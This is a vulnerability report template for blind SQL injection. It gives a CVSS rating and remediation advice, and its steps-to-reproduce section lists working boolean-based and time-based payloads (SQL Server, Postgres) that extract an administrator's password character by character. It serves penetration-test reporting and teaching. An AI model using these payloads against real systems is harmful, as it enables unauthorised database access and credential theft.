# SQL Injection - Blind SQL Injection

**Title:** Blind SQL Injection for Data Extraction

**Severity:** High

**Impact:** High

**Exploitability:** Medium

**CVSS Base Score:** 7.5

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Vulnerability Type:** SQL Injection

**Target:** TrackingId or similar parameter

## Impact

Allows complete database enumeration and data exfiltration even when no data is directly reflected in the application response.

## Description

The application is vulnerable to blind SQL injection. Differences in response (boolean-based) or timing (time-based) can be used to extract data character by character.

## Steps to Reproduce

### Boolean-based

Test true/false conditions:
```
' AND '1'='1
' AND '1'='2
```

Extract length:
```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
```

Extract characters:
```
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm
```

### Time-based (SQL Server)

```
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

Exploitation:
```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

Postgres:
```
%3BSELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

## Recommendation

Use parameterized queries. Avoid dynamic SQL. Ensure consistent responses and timing for valid/invalid inputs. Consider using an ORM.

## References

- PortSwigger SQL Injection Cheat Sheet
- OWASP SQL Injection Prevention Cheat Sheet
